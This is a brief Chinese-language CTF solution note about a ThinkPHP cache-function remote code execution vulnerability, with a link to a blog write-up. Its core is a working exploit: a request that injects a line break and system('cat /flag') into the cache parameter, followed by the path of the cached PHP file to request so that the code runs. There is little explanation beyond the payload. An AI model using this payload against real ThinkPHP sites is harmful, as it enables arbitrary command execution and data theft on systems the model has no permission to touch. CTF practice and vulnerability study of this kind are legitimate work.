# 知识点
[Thinkphp cache缓存函数远程代码执行漏洞_bfengj的博客-CSDN博客_thinkphp缓存漏洞](https://blog.csdn.net/rfrder/article/details/114599310)
# 思路
```php
public/index.php?s=index/index/rce&cache=%0d%0asystem('cat /flag');//
接着访问
runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php
```

